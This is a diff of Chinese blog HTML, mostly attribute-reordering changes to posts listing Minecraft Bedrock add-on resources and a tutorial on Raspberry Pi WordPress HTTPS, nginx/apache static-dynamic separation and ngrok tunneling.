 <p>看了这么多的shell，有没有新的想法？快在下面交流吧</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://mimonatch.github.io/passages/linux-e4-b8-8a-e8-87-aa-e5-8a-a8-e6-a3-80-e6-b5-8b-e8-bf-9b-e7-a8-8b-e4-b8-94-e9-87-8d-e5-90-af-e8-bf-9b-e7-a8-8b-e7-9a-84shell-e8-bd-ac-e8-bd-bd/" data-id="ckqv2rh0s0028esvsb5mn9t0z" class="article-share-link">Share</a>
+      <a data-url="http://mimonatch.github.io/passages/linux-e4-b8-8a-e8-87-aa-e5-8a-a8-e6-a3-80-e6-b5-8b-e8-bf-9b-e7-a8-8b-e4-b8-94-e9-87-8d-e5-90-af-e8-bf-9b-e7-a8-8b-e7-9a-84shell-e8-bd-ac-e8-bd-bd/" data-id="ckqvbhfvg002wbwvs94yg7w80" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shell/" rel="tag">shell</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" rel="tag">自动化</a></li></ul>
@@ -817,33 +839,33 @@ nohup $PNAME &gt;/dev/null</code></pre><p>这个是最有意思的一个shell了
       
         <p><strong>本文不介绍工具的使用工具的介绍如何制作的教程</strong></p>
 <p><em><strong>本文可以一起来编辑，将新的资源url添加到下面，一同来分享</strong></em></p>
-<p><a href="https://www.xiaoblogs.cn/wp-admin/" target="_blank" rel="noopener"><em>本站登录点我</em></a></p>
+<p><a target="_blank" rel="noopener" href="https://www.xiaoblogs.cn/wp-admin/"><em>本站登录点我</em></a></p>
 <p>用户名：minecraftbdsgroup</p>
 <p>密码： minecraftbdsgroup</p>
 <p><strong>Add-on行为包</strong></p>
-<p><strong>英文Wiki</strong>行为包教程总览： <a href="https://minecraft.gamepedia.com/Add-on" target="_blank" rel="noopener">https://minecraft.gamepedia.com/Add-on</a></p>
-<p><strong>中文Wiki</strong>行为包<strong>制作</strong>教程： <a href="https://minecraft-zh.gamepedia.com/%E6%95%99%E7%A8%8B/%E5%88%B6%E4%BD%9C%E8%A1%8C%E4%B8%BA%E5%8C%85" target="_blank" rel="noopener">https://minecraft-zh.gamepedia.com/%E6%95%99%E7%A8%8B/%E5%88%B6%E4%BD%9C%E8%A1%8C%E4%B8%BA%E5%8C%85</a></p>
-<p><strong>【非官方】中文MCBBS论坛</strong>制作行为包教程（1.14.0版本）： <a href="https://www.mcbbs.net/thread-829760-1-1.html" target="_blank" rel="noopener">https://www.mcbbs.net/thread-829760-1-1.html</a></p>
-<p><strong>【非官方】GitHub</strong>行为包制作总览（1.14.0版本）： <a href="https://github.com/SPGoding/mcbbs-threads/blob/master/tutorials/behavior-pack/thread.md" target="_blank" rel="noopener">https://github.com/SPGoding/mcbbs-threads/blob/master/tutorials/behavior-pack/thread.md</a></p>
-<p>英文Wiki<strong>我的世界物品实体ID名字行为包参数</strong>文档： <a href="https://minecraft.gamepedia.com/Bedrock_Edition_add-on_documentation" target="_blank" rel="noopener">https://minecraft.gamepedia.com/Bedrock_Edition_add-on_documentation</a></p>
+<p><strong>英文Wiki</strong>行为包教程总览： <a target="_blank" rel="noopener" href="https://minecraft.gamepedia.com/Add-on">https://minecraft.gamepedia.com/Add-on</a></p>
+<p><strong>中文Wiki</strong>行为包<strong>制作</strong>教程： <a target="_blank" rel="noopener" href="https://minecraft-zh.gamepedia.com/%E6%95%99%E7%A8%8B/%E5%88%B6%E4%BD%9C%E8%A1%8C%E4%B8%BA%E5%8C%85">https://minecraft-zh.gamepedia.com/%E6%95%99%E7%A8%8B/%E5%88%B6%E4%BD%9C%E8%A1%8C%E4%B8%BA%E5%8C%85</a></p>
+<p><strong>【非官方】中文MCBBS论坛</strong>制作行为包教程（1.14.0版本）： <a target="_blank" rel="noopener" href="https://www.mcbbs.net/thread-829760-1-1.html">https://www.mcbbs.net/thread-829760-1-1.html</a></p>
+<p><strong>【非官方】GitHub</strong>行为包制作总览（1.14.0版本）： <a target="_blank" rel="noopener" href="https://github.com/SPGoding/mcbbs-threads/blob/master/tutorials/behavior-pack/thread.md">https://github.com/SPGoding/mcbbs-threads/blob/master/tutorials/behavior-pack/thread.md</a></p>
+<p>英文Wiki<strong>我的世界物品实体ID名字行为包参数</strong>文档： <a target="_blank" rel="noopener" href="https://minecraft.gamepedia.com/Bedrock_Edition_add-on_documentation">https://minecraft.gamepedia.com/Bedrock_Edition_add-on_documentation</a></p>
 <p>编写行为包工具（文本编辑工具就可以，支持json的）：</p>
 <ul>
-<li>vscode</li>
-<li>sublime text</li>
-<li>notepad++</li>
-<li>等等</li>
+<li>  vscode</li>
+<li>  sublime text</li>
+<li>  notepad++</li>
+<li>  等等</li>
 </ul>
-<p>【非官方】不用PC和iOS越狱制作行为包的方法（需翻墙、英文）：<a href="https://www.youtube.com/watch?v=laChbsKwwYc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=laChbsKwwYc</a></p>
-<p>【官方】官网行为包基础模板下载： <a href="https://www.minecraft.net/en-us/addons/" target="_blank" rel="noopener">https://www.minecraft.net/en-us/addons/</a></p>
-<p>【非官方】我的私有云盘下载：<br><strong>下载连接</strong>：<a href="http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/" target="_blank" rel="noopener">http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/</a><br><strong>直接下载连接</strong>：<a href="http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/?dl=1" target="_blank" rel="noopener">http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/?dl=1</a></p>
+<p>【非官方】不用PC和iOS越狱制作行为包的方法（需翻墙、英文）：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=laChbsKwwYc">https://www.youtube.com/watch?v=laChbsKwwYc</a></p>
+<p>【官方】官网行为包基础模板下载： <a target="_blank" rel="noopener" href="https://www.minecraft.net/en-us/addons/">https://www.minecraft.net/en-us/addons/</a></p>
+<p>【非官方】我的私有云盘下载：<br><strong>下载连接</strong>：<a target="_blank" rel="noopener" href="http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/">http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/</a><br><strong>直接下载连接</strong>：<a target="_blank" rel="noopener" href="http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/?dl=1">http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/?dl=1</a></p>
 <p><strong>resource资源包</strong></p>
-<p>【官方】官网行为包基础模板下载： <a href="https://www.minecraft.net/en-us/addons/" target="_blank" rel="noopener">https://www.minecraft.net/en-us/addons/</a></p>
-<p>【非官方】我的私有云盘下载：<br><strong>下载连接</strong>：<a href="http://seafile.xiaoblogs.cn:8000/f/5f5695e2750e4e948923/" target="_blank" rel="noopener">http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/</a><br><strong>直接下载连接</strong>：<a href="http://seafile.xiaoblogs.cn:8000/f/5f5695e2750e4e948923/?dl=1" target="_blank" rel="noopener">h</a><a href="http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/?dl=1" target="_blank" rel="noopener">ttp://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/?dl=1</a></p>
+<p>【官方】官网行为包基础模板下载： <a target="_blank" rel="noopener" href="https://www.minecraft.net/en-us/addons/">https://www.minecraft.net/en-us/addons/</a></p>
+<p>【非官方】我的私有云盘下载：<br><strong>下载连接</strong>：<a target="_blank" rel="noopener" href="http://seafile.xiaoblogs.cn:8000/f/5f5695e2750e4e948923/">http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/</a><br><strong>直接下载连接</strong>：<a target="_blank" rel="noopener" href="http://seafile.xiaoblogs.cn:8000/f/5f5695e2750e4e948923/?dl=1">h</a><a target="_blank" rel="noopener" href="http://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/?dl=1">ttp://seafile.xiaoblogs.cn:8000/f/2d0886aa3f954f4cb5b4/?dl=1</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://mimonatch.github.io/passages/minecraft-bedrock-edition-e6-88-91-e7-9a-84-e4-b8-96-e7-95-8c-e5-9f-ba-e5-b2-a9-e7-89-88-e5-bc-80-e5-8f-91-e8-b5-84-e6-ba-90-e6-80-bb-e8-a7-88-ef-bc-88-e6-8c-81-e7-bb-ad-e6-9b-b4-e6-96-b0-ef-bc-89-1/" data-id="ckqv2rh0v002gesvsbp286cp0" class="article-share-link">Share</a>
+      <a data-url="http://mimonatch.github.io/passages/minecraft-bedrock-edition-e6-88-91-e7-9a-84-e4-b8-96-e7-95-8c-e5-9f-ba-e5-b2-a9-e7-89-88-e5-bc-80-e5-8f-91-e8-b5-84-e6-ba-90-e6-80-bb-e8-a7-88-ef-bc-88-e6-8c-81-e7-bb-ad-e6-9b-b4-e6-96-b0-ef-bc-89-1/" data-id="ckqvbhfvi002zbwvs31qogiu8" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/addon/" rel="tag">addon</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/minecraft/" rel="tag">minecraft</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C/" rel="tag">我的世界</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%A1%8C%E4%B8%BA%E5%8C%85/" rel="tag">行为包</a></li></ul>
@@ -881,120 +903,130 @@ nohup $PNAME &gt;/dev/null</code></pre><p>这个是最有意思的一个shell了
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>上次我们看过了如何用树莓派搭建wordpress，<a href="https://www.xiaoblogs.cn/?p=323" target="_blank" rel="noopener">上一篇文章传送门</a></p>
+        <p>上次我们看过了如何用树莓派搭建wordpress，<a target="_blank" rel="noopener" href="https://www.xiaoblogs.cn/?p=323">上一篇文章传送门</a></p>
 <p>这一次我们来玩一点不一样的，弄一点树莓派wordpress的进阶的玩法。</p>
 <p>1、配置https，让域名前加一个小锁子</p>
 <p>2、配置动静分离</p>
 <p>3、内网的博客怎么办，内网穿透就行</p>
 <p>4、可以用CDN加速博客的访问</p>
 <p><strong>购买一个专属自己的域名，配置https</strong></p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-36.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-36.png"></p>
 <p>我们的网址怎么是一个IP啊</p>
 <p>很多个人博客的域名都是通过阿里云等域名服务商进行购买的，有很多的域名可以选择，你像我都小博客就是.cn结尾的博客</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-37-1024x529.png" alt=""></p>
-<p><a href="https://wanwang.aliyun.com/domain?spm=5176.8076989.968347.5.762f18385ti4YJ" target="_blank" rel="noopener">有很多后缀的域名，可以购买一个自己喜欢的</a></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-37-1024x529.png"></p>
+<p><a target="_blank" rel="noopener" href="https://wanwang.aliyun.com/domain?spm=5176.8076989.968347.5.762f18385ti4YJ">有很多后缀的域名，可以购买一个自己喜欢的</a></p>
 <p>因为现在的域名需要备案，所以我这里就不演示域名的购买和备案的过程了。其中ICP备案的流程应该是有2周左右，你需要提交申请书等一系列的操作</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/p50198.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/p50198.png"></p>
 <p>有了域名之后就可以使用HTTPS( Hyper Text Transfer Protocol over SecureSocket Layer)协议了</p>
 <p><strong>何为HTTPs</strong></p>
 <p>其实你可以拆开看，为HTTP + SSL/TLS 目的就是加密你的数据，让你上网访问你的博客更安全。</p>
 <p>加密数据可以让你的数据安全起来，https采用的加密方式是非对称加密和对称加密，分别用在的整个连接的不同的阶段</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/4178468217-5cc8107833761-1024x603.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/4178468217-5cc8107833761-1024x603.png"></p>
 <p>https工作流程</p>
 <p>这里面涉及到证书的问题，证书是干什么的。浏览器为了确认就是你发送的https请求，而不是别人发送的，也就是说为了防止报文数据的篡改。</p>
 <p>通过上面的流程也就知道了我们应该申请一个数字证书，而且在服务器进行配置</p>
 <p>如果你是通过域名服务商那里购买的域名，ICP备案完成后就可以直接去域名的仪表板里面下载域名对应的证书，我的是CA机构免费颁发的证书（下面用阿里云来举例子）</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-38-1024x122.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-38-1024x122.png"></p>
 <p>免费的证书一年</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-39.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-39.png"></p>
 <p>也可以上传自己的证书</p>
 <p>证书都上传完毕了，之后就是在自己的服务器上配置了</p>
 <p><strong>nginx配置https</strong></p>
 <p>https和http的通信的端口是不同的，https是443，http是80</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-40.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-40.png"></p>
 <pre><code>ssl on;
 ssl_certificate /path/to/你的证书.pem;
 ssl_certificate_key /path/to/你的私钥.key;
 ssl_session_timeout 5m;
 ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
 ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
-ssl_prefer_server_ciphers on;</code></pre><p>通过上图的原理图其实很好理解配置的部分，首先要开启ssl，之后就是配置公钥证书，之后配置服务器的私钥用于解密客户端用公钥加密的会话密钥，会话密钥用来加密C和S直接传输的数据</p>
+ssl_prefer_server_ciphers on;
+</code></pre>
+<p>通过上图的原理图其实很好理解配置的部分，首先要开启ssl，之后就是配置公钥证书，之后配置服务器的私钥用于解密客户端用公钥加密的会话密钥，会话密钥用来加密C和S直接传输的数据</p>
 <p>之后的配置ssl_session_timeout为会话限制时间、ssl_ciphers为整个流程中对称加密的算法，ssl_protocols为支持的传输层安全协议，之后ssl_prefer_server_ciphers是依赖SSLv3和TLSv1协议的服务器密码将优先于客户端密码</p>
 <p><strong>apache2配置https</strong></p>
 <p>apache2配置就更简单了，默认会有一个ssl配置的文件，只要填好证书和密钥的位置就可以了</p>
 <p>前提是要安装好apache的php模块</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-41.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-41.png"></p>
 <p>如果用nginx处理全部的https请求就不用配置apache2了，否则会起端口冲突</p>
 <p>配置好之后就是测试下吧</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-43.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-43.png"></p>
 <p>可以看到浏览器的地址栏如果有锁子的标识就证明连接安全哦</p>
 <p><strong>配置动静分离</strong></p>
 <p>还记得上次我们通过f12的开发者工具看到的资源和整个博客都是来自nginx的吗</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-15-095308-1024x522.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-15-095308-1024x522.png"></p>
 <p>看，又给你看一遍</p>
 <p>我们先来了解下nginx和apache分别适合处理什么文件，什么应用场景</p>
-<p>nginx：既可以在内部直接支持 Rails 和 PHP 程序对外进行服务，也可以支持作为 HTTP<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1" target="_blank" rel="noopener">代理服务</a>对外进行服务。Nginx采用C进行编写，不论是系统资源开销还是CPU使用效率都比 Perlbal 要好很多。处理静态文件，索引文件以及自动索引，打开文件描述符缓冲。无缓存的反向代理加速，简单的负载均衡和容错。FastCGI，简单的负载均衡和容错。 （<a href="https://baike.baidu.com/item/nginx/3817705?fr=aladdin" target="_blank" rel="noopener">来自度娘</a>）</p>
-<p>apache： 超稳定， 对PHP支持比较简单， 处理动态请求有优势，nginx在这方面是鸡肋，一般动态请求要apache去做，nginx适合静态和反向。（<a href="https://blog.csdn.net/lilygg/article/details/87873964" target="_blank" rel="noopener">来自CSDN</a>）</p>
+<p>nginx：既可以在内部直接支持 Rails 和 PHP 程序对外进行服务，也可以支持作为 HTTP<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1">代理服务</a>对外进行服务。Nginx采用C进行编写，不论是系统资源开销还是CPU使用效率都比 Perlbal 要好很多。处理静态文件，索引文件以及自动索引，打开文件描述符缓冲。无缓存的反向代理加速，简单的负载均衡和容错。FastCGI，简单的负载均衡和容错。 （<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/nginx/3817705?fr=aladdin">来自度娘</a>）</p>
+<p>apache： 超稳定， 对PHP支持比较简单， 处理动态请求有优势，nginx在这方面是鸡肋，一般动态请求要apache去做，nginx适合静态和反向。（<a target="_blank" rel="noopener" href="https://blog.csdn.net/lilygg/article/details/87873964">来自CSDN</a>）</p>
 <p>简单的了解了下之后就明白了我们为什么要动静分离了</p>
 <p>具体思路：nginx服务器处理前端的请求，如果是请求的静态文件就可以直接处理，但是如果是动态文件就交予后端的apache2服务器。之后apache2直接通过80端口响应</p>
 <p>我这里是实现动静分离，不是nginx的负载均衡、反向代理</p>
 <p><strong>注意：是两台服务器，不是一台进行配置</strong>。<br><strong>以下的nginx服务器为192.168.0.115</strong><br><strong>这里wireless是115，以太网是192.168.0.118</strong><br><strong>以下的apache2服务器为192.168.0.117</strong></p>
 <p>配置nginx</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-51.png" alt=""></p>
-<pre><code>location ~* \.(png|jpg|jpeg|gif|bmp|html|swf|ico|rar|zip|txt|doc|ppt|pdf|xls)$ { expires 1d;  }
-location ~ \.(js.css)$ {  expires 1h; }
-location ~ \.php$ {
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-51.png"></p>
+<pre><code>location ~* \.(png|jpg|jpeg|gif|bmp|html|swf|ico|rar|zip|txt|doc|ppt|pdf|xls)$ &#123; expires 1d;  &#125;
+location ~ \.(js.css)$ &#123;  expires 1h; &#125;
+location ~ \.php$ &#123;
                 #proxy_set_header Host $host;
                 #proxy_set_header X-Real_IP $remote_addr;
                 #proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                 proxy_pass http://ip2yourapacheserver:8080;
- }</code></pre><p>配置静态文件直接在浏览器缓存中保存的时长，这样就不需要每一次访问博客都请求这些静态的资源文件，因为这些文件是不改变的。</p>
+ &#125;
+</code></pre>
+<p>配置静态文件直接在浏览器缓存中保存的时长，这样就不需要每一次访问博客都请求这些静态的资源文件，因为这些文件是不改变的。</p>
 <p>说明下php的配置部分</p>
 <p><strong>remote_addr</strong><br>是nginx与客户端进行TCP连接过程中，获得的客户端真实地址. Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求</p>
 <p><strong>X-Real-IP</strong><br>是一个自定义头。X-Real-Ip 通常被 HTTP 代理用来表示与它产生 TCP 连接的设备 IP，这个设备可能是其他代理，也可能是真正的请求端。需要注意的是，X-Real-Ip 目前并不属于任何标准，代理和 Web 应用之间可以约定用任何自定义头来传递这个信息</p>
 <p><strong>X-Forwarded-For</strong><br>X-Forwarded-For 是一个扩展头。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP，现在已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC 7239（Forwarded HTTP Extension）标准之中.</p>
-<p>（<a href="https://www.jianshu.com/p/15f3498a7fad" target="_blank" rel="noopener">作者：大富帅 链接：https://www.jianshu.com/p/15f3498a7fad</a>）</p>
+<p>（<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/15f3498a7fad">作者：大富帅 链接：https://www.jianshu.com/p/15f3498a7fad</a>）</p>
 <p>检查下语法</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-45.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-45.png"></p>
 <p>ok</p>
 <p><strong>配置apache</strong></p>
 <p>这里我用了另一台服务器，用apache2来解析处理php文件</p>
 <p>注意，因为我的wordpress都是保存在本地的，所以，我就有了nginx服务器的MySQL和apache2服务器的MySQL，这样就有了两个数据库。但是我们只要一个就好，所以我这里想的是做MySQL的主从复制。apache2的MySQL为主服务器，nginx的为从服务器</p>
 <p>但是建议还是用一台云MySQL，这样省事</p>
 <p>首先配置监听端口</p>
-<pre><code>sudo vim /path/to/ports.conf</code></pre><p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-46.png" alt=""></p>
+<pre><code>sudo vim /path/to/ports.conf
+</code></pre>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-46.png"></p>
 <p>80改成8080就行，别忘了80端口，因为要通过其响应请求</p>
 <p>因为是给后端8080端口的apache2，所以apache2要监听8080端口</p>
 <p>之后修改virtual server文件</p>
-<pre><code>sudo vim /path/to/apache2/sites-available/000-default.conf</code></pre><p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-47.png" alt=""></p>
+<pre><code>sudo vim /path/to/apache2/sites-available/000-default.conf
+</code></pre>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-47.png"></p>
 <p>上面的监听端口和下面的文件目录都要改了</p>
 <p>之后测试我遇到了一个问题</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-48.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-48.png"></p>
 <p>直接返回php文件了，注意这个的nginx服务器的IP和apache的IP都不是最终的</p>
 <p>这是怎么回事呢，原来apache2安装完之后是不带php的模块了</p>
 <p>apt检查下下载的模块</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-55.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-55.png"></p>
 <p><strong>我的php是7.2所以也要下载7.2的模块哦，千万别错了</strong></p>
 <p>之后我们访问nginx服务器192.168.0.115，当然，访问apache服务器也是可以的。</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-27-230159-1024x487.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-27-230159-1024x487.png"></p>
 <p>访问nginx是301重定向</p>
 <p>我们先看看动态文件</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-52.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-52.png"></p>
 <p>可以看到处理请求的服务器是apache2</p>
 <p>我们再来看看静态文件</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-53.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-53.png"></p>
 <p>服务器是nginx文件类型是css</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-50.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-50.png"></p>
 <p>测试下安装一个主题，我的apache服务器是wireless，导致一直有Too many requests的错误<br>好不容易才安装好了一个主题</p>
 <p>结果换完主题是空白一片，这个主题的css等就没加载出来，我最后还是换一个已经安装的别的主题了</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-54-1024x576.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-54-1024x576.png"></p>
 <p>可以看到没什么问题</p>
 <p>到这里动静分离的部分就完成啦，通过ab测试下和前面单nginx对比下</p>
-<pre><code>ab -n 1000 http://your_server_ip/path/to/your.file</code></pre><p><strong>实现动静分离后的RPS</strong></p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-27-232959.png" alt=""></p>
+<pre><code>ab -n 1000 http://your_server_ip/path/to/your.file
+</code></pre>
+<p><strong>实现动静分离后的RPS</strong></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-27-232959.png"></p>
 <p>是17.30</p>
 <p><strong>没有实现动静分离的RPS</strong></p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%B2%A1%E7%94%A8%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%B2%A1%E7%94%A8%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB.png"></p>
 <p>呦，有点差</p>
 <p>通过上面的测试也可以看到动静分离，让软件干擅长的事情是多么的重要了吧</p>
 <p><strong>内网穿透这点事</strong></p>
@@ -1003,31 +1035,31 @@ location ~ \.php$ {
 <p>内网穿透的种类也有很多，最常用的就是端口映射NAPT。将公网IP的一个端口对应内网的一个IP</p>
 <p>内网穿透的工具很多，花生壳，向日癸，ngrok第一代，和frp等</p>
 <p>ngrok第一代是开源的，第二代作者商用就闭源了。frp和ngrok差不多，如果是个人的网站使用谁都可以。如果访问量大则建议frp</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-56.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-56.png"></p>
 <p>几款穿透工具对比</p>
 <p>ngrok的原理简单来讲是反向代理，ngrok服务器和后端请求的服务器透明之后和客户端建立一个隧道</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-58.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-58.png"></p>
 <p>很明确的一张原理图</p>
 <p>还有一个好处就是可以让后端的服务器对于客户端不可见，客户端见到的只是ngrok服务器</p>
 <p>ngrok如果要自己搭建ngrok服务器就需要一台公网的服务器，但是大家大多数都没有（要不然要什么内网穿透建站呢，直接在公网服务器上搭建不就行了！）</p>
-<p>这里我推荐一个<a href="http://ngrok.ciqiuwl.cn/" target="_blank" rel="noopener">小米球</a></p>
+<p>这里我推荐一个<a target="_blank" rel="noopener" href="http://ngrok.ciqiuwl.cn/">小米球</a></p>
 <p>里面有详细的下载ngrok客户端的步骤，以及如何使用的详细步骤</p>
 <p><strong>Ngrok1.7：</strong></p>
-<p>这里推荐国内的<a href="https://manager.xiaomiqiu.com/" target="_blank" rel="noopener">小米球Ngrok服务</a>，是国人搭建的</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-1024x549.png" alt=""></p>
+<p>这里推荐国内的<a target="_blank" rel="noopener" href="https://manager.xiaomiqiu.com/">小米球Ngrok服务</a>，是国人搭建的</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-1024x549.png"></p>
 <p>右下角下载响应的客户端</p>
 <p>下载好之后上传到树莓派</p>
 <p>这里我的站点的URL填写的是frp.xiaoblogs.cn，但是没有设置这个域名的解析，导致站点的资源文件后台登录都用不了了。这里我用的是一个简单的方法。</p>
 <p>首先在树莓派的/etc/hosts文件里面添加一个记录，让我的这个域名指向本机</p>
 <p>之后重启网卡或者reboot使生效</p>
 <p>之后ping一下域名看是不是解析到本机了</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-1.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-1.png"></p>
 <p>嗯~ o(<em>￣▽￣</em>)o</p>
 <p>之后就可以进入wordpress的控制面板更改URL了</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-2-1024x549.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-2-1024x549.png"></p>
 <p>URL就改成映射的ngrok服务器给你提供的url吧</p>
 <p>对了，我们还没讲配置ngork呢</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-3.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-3.png"></p>
 <p>ngrok照frp的配置要简单多了，可能也是我前面的时候一直用的是ngrok</p>
 <p>auth_token是在注册系统中给你的，在小米球Ngrok管理系统中能找到</p>
 <p>tunnels能里面的所有隧道都可以自己指定名称eg.httptun</p>
@@ -1035,81 +1067,87 @@ location ~ \.php$ {
 <p>subdomain子域名自己随机设定，别设定成和别人一样的就行</p>
 <p>配置好就启动吧</p>
 <p>首先先启动ngork吧，看一看给你分配的url</p>
